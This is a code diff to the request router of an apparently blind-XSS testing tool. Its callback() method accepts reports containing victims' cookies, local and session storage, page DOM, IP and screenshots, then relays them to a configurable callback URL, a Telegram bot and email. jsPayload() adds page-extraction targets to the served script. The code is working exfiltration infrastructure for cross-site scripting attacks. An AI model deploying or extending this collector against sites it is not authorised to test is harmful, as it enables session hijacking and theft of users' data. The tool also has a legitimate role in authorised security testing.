@@ -9,7 +9,7 @@ class Route
      * Default values stored
      * @method __construct
      */
-    function __construct()
+    public function __construct()
     {
         $this->validTemplates = [
             'login',
@@ -37,7 +37,7 @@ class Route
      * @param string $file Requested file link
      * @return string HTML for page
      */
-    public function template($file)
+    public function template($file): string
     {
         if (!in_array($file, $this->validTemplates, true)) {
             return $this->redirect('login');
@@ -85,10 +85,10 @@ class Route
      * @param string $page Page link to redirect to
      * @return string
      */
-    private function redirect($page)
+    private function redirect($page): string
     {
         $_SESSION['redirect'] = $_SERVER['REQUEST_URI'];
-        header("Location: /manage/{$page}");
+        header("Location: /".adminURL."/{$page}");
         return 'Redirect';
     }
 
@@ -98,7 +98,7 @@ class Route
      * @param string $file Requested file link
      * @return string HTML for page
      */
-    private function parseTemplate($file)
+    private function parseTemplate($file): string
     {
         $html = str_replace(
             ['{{template}}', '{{menu}}', '{{title}}', '{{version}}'],
@@ -130,7 +130,7 @@ class Route
      * @param string $extension
      * @return string HTML of template
      */
-    private function getFile($file, $extension = 'html')
+    private function getFile($file, $extension = 'html'): string
     {
         return file_get_contents(__DIR__ . "/../templates/{$file}.{$extension}");
     }
@@ -141,16 +141,17 @@ class Route
      * @param string $phpInput POST information
      * @return string github.com/ssl/ezXSS
      */
-    public function callback($phpInput)
+    public function callback($phpInput): string
     {
         $json = json_decode($phpInput, false);
+        $json->screenshot = $json->screenshot ?? '';
 
         $setting = [];
         foreach ($this->database->query('SELECT * FROM settings') as $settings) {
             $setting[$settings['setting']] = $settings['value'];
         }
 
-        $userIp = $json->ip ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
+        $userIp = $json->ip ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
         $domain = htmlspecialchars($_SERVER['SERVER_NAME']);
         $json->origin = str_replace(['https://', 'http://'], '', $json->origin);
 
@@ -159,6 +160,14 @@ class Route
                 explode(',', $setting['blocked-domains']),
                 true
             )) {
+            return 'github.com/ssl/ezXSS';
+        }
+
+        if ($setting['whitelist-domains'] !== '' && $json->origin !== $setting['whitelist-domains'] && in_array(
+                $json->origin,
+                explode(',', $setting['whitelist-domains']),
+                true) === false
+        ) {
             return 'github.com/ssl/ezXSS';
         }
 
@@ -224,55 +233,95 @@ class Route
             );
 
             if (($doubleReport && $setting['filter-alert'] == 1) || (!$doubleReport)) {
-                if (!empty($json->screenshot)) {
-                    $json->screenshot = $this->basic->screenshotPath($screenshotName);
+                if($setting['alert-callback'] === '1') {
+                    $cb = curl_init((parse_url($setting['callback-url'], PHP_URL_SCHEME) ? '' : 'https://') . $setting['callback-url']);
+                    curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
+                    curl_setopt($cb, CURLOPT_POSTFIELDS, $phpInput);
+                    curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+                    curl_exec($cb);
                 }
 
-                $htmlTemplate = str_replace(
-                    [
-                        '{{id}}',
-                        '{{domain}}',
-                        '{{url}}',
-                        '{{ip}}',
-                        '{{referer}}',
-                        '{{payload}}',
-                        '{{user-agent}}',
-                        '{{cookies}}',
-                        '{{localstorage}}',
-                        '{{sessionstorage}}',
-                        '{{dom}}',
-                        '{{origin}}',
-                        '{{time}}',
-                        '{{screenshot}}'
-                    ],
-                    [
-                        $reportId,
-                        htmlspecialchars($domain),
-                        htmlspecialchars($json->uri),
-                        htmlspecialchars($userIp),
-                        htmlspecialchars($json->referer),
-                        htmlspecialchars($json->payload),
-                        htmlspecialchars($json->{'user-agent'}),
-                        htmlspecialchars($json->cookies),
-                        htmlspecialchars(json_encode($json->localstorage)),
-                        htmlspecialchars(json_encode($json->sessionstorage)),
-                        htmlspecialchars(substr($json->dom, 0, $setting['dompart'])) . $domExtra,
-                        htmlspecialchars($json->origin),
-                        date('F j Y, g:i a'),
-                        $json->screenshot
-                    ],
-                    $this->basic->htmlBlocks('mail')
-                );
+                if($setting['alert-telegram'] === '1') {
+                    if (!empty($json->screenshot)) {
+                        $json->screenshot = $this->basic->screenshotPath($screenshotName);
+                    }
 
-                $headers[] = 'From: ' . $setting['emailfrom'];
-                $headers[] = 'MIME-Version: 1.0';
-                $headers[] = 'Content-type: text/html; charset=iso-8859-1';
-                mail(
-                    $setting['email'],
-                    'XSS on ' . htmlspecialchars($json->uri),
-                    $htmlTemplate,
-                    implode("\r\n", $headers)
-                );
+                    $markdownTemplate = str_replace(
+                        [
+                            '{{adminURL}}', '{{id}}', '{{domain}}', '{{url}}', '{{ip}}',
+                            '{{referer}}', '{{payload}}', '{{user-agent}}', '{{cookies}}', '{{localstorage}}',
+                            '{{sessionstorage}}', '{{dom}}', '{{origin}}', '{{time}}', '{{screenshot}}'
+                        ],
+                        [
+                            adminURL, $reportId, $domain, $json->uri, $userIp, $json->referer !== '' ? $json->referer : ' ', $json->payload,
+                            $json->{'user-agent'}, $json->cookies, json_encode($json->localstorage), json_encode($json->sessionstorage),
+                            substr($json->dom, 0, $setting['dompart']) . $domExtra, $json->origin, date('F j Y, g:i a'), $json->screenshot !== '' ? $json->screenshot : ' '
+                        ],
+                        $this->basic->htmlBlocks('telegram')
+                    );
+
+                    $cb = curl_init('https://api.telegram.org/bot' . $setting['telegram-bottoken'] . '/sendMessage');
+                    curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
+                    curl_setopt($cb, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $setting['telegram-chatid'], 'parse_mode' => 'markdown', 'text' => $markdownTemplate]));
+                    curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+                    curl_exec($cb);
+                }
+
+                if($setting['alert-mail'] === '1') {
+                    if (!empty($json->screenshot)) {
+                        $json->screenshot = $this->basic->screenshotPathImg($screenshotName);
+                    }
+
+                    $htmlTemplate = str_replace(
+                        [
+                            '{{adminURL}}',
+                            '{{id}}',
+                            '{{domain}}',
+                            '{{url}}',
+                            '{{ip}}',
+                            '{{referer}}',
+                            '{{payload}}',
+                            '{{user-agent}}',
+                            '{{cookies}}',
+                            '{{localstorage}}',
+                            '{{sessionstorage}}',
+                            '{{dom}}',
+                            '{{origin}}',
+                            '{{time}}',
+                            '{{screenshot}}'
+                        ],
+                        [
+                            adminURL,
+                            $reportId,
+                            htmlspecialchars($domain),
+                            htmlspecialchars($json->uri),
+                            htmlspecialchars($userIp),
+                            htmlspecialchars($json->referer),
+                            htmlspecialchars($json->payload),
+                            htmlspecialchars($json->{'user-agent'}),
+                            htmlspecialchars($json->cookies),
+                            htmlspecialchars(json_encode($json->localstorage)),
+                            htmlspecialchars(json_encode($json->sessionstorage)),
+                            htmlspecialchars(substr($json->dom, 0, $setting['dompart'])) . $domExtra,
+                            htmlspecialchars($json->origin),
+                            date('F j Y, g:i a'),
+                            $json->screenshot
+                        ],
+                        $this->basic->htmlBlocks('mail')
+                    );
+
+                    $headers[] = 'From: ' . $setting['emailfrom'];
+                    $headers[] = 'MIME-Version: 1.0';
+                    $headers[] = 'Content-type: text/html; charset=iso-8859-1';
+                    mail(
+                        $setting['email'],
+                        'XSS on ' . htmlspecialchars($json->uri),
+                        $htmlTemplate,
+                        implode("\r\n", $headers)
+                    );
+                }
             }
         }
 
@@ -284,7 +333,7 @@ class Route
      * @method jsPayload
      * @return string Javascript payload code
      */
-    public function jsPayload()
+    public function jsPayload(): string
     {
         if (!$this->database->isInstalled()) {
             return $this->redirect('install');
@@ -307,8 +356,18 @@ class Route
             }
         }
 
+        $pages = $this->database->fetchSetting('extract-pages');
+        $pages = explode('|||', $pages);
+        $pagesString = '';
+        foreach($pages as $page) {
+            if(empty($page)) {
+                continue;
+            }
+            $pagesString .= "'".htmlspecialchars($page, ENT_QUOTES)."',";
+        }
+
         return str_replace(
-            ['{{domain}}', '{{screenshot}}', '{{customjs}}', '{{version}}', '{{payload}}', '{{payloadFile}}', '{{noCollect}}'],
+            ['{{domain}}', '{{screenshot}}', '{{customjs}}', '{{version}}', '{{payload}}', '{{payloadFile}}', '{{noCollect}}', '{{pages}}'],
             [
                 $this->basic->domain(),
                 (($this->database->fetchSetting('collect_screenshot')) ? $this->getFile('screenshot', 'js') : ''),
@@ -316,7 +375,8 @@ class Route
                 version,
                 htmlspecialchars("//{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}"),
                 $payloadFile,
-                rtrim($noCollect, ',')
+                rtrim($noCollect, ','),
+                rtrim($pagesString, ',')
             ],
             $this->getFile($payloadFile, 'js')
         );
